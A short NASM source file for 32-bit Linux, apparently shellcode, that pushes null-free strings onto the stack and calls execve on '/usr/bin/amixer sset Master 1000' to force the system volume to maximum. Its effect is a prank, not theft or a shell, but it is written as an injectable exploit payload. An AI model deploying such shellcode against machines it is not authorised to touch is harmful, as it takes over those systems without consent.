; Filename: max_volume.nasm
; Author:  Kwisaba Hamza ([at] evil_comrade)
; sulleyfidempa [at] yahoo [dot] com
; 1evilcomrade [dot] blogspot [dot] com
; sets the volume of the linux volume to maximum tested on Ubuntu
; //usr/bin/amixer sset master 1000
; 


global _start			
section .text
_start:

	; PUSH the first null dword 
	xor eax, eax
	push eax
	push 0x30303031	     ;1000
	mov ebp, esp
	
	
	push eax
	push WORD 0x7265      ;master
	push 0x7473614d
	mov esi, esp	

	push eax
	push 0x74657373      ;sset
	mov edi, esp	

	push eax
        push 0x72657869       ;//usr/bin/amixer
        push 0x6d612f6e
        push 0x69622f72
        push 0x73752f2f
	mov ebx, esp    

	push eax       
	mov edx, esp  
	push ebp
	push esi
	push edi
	push ebx  
   
	mov ecx, esp
	mov al, 11      
	int 0x80
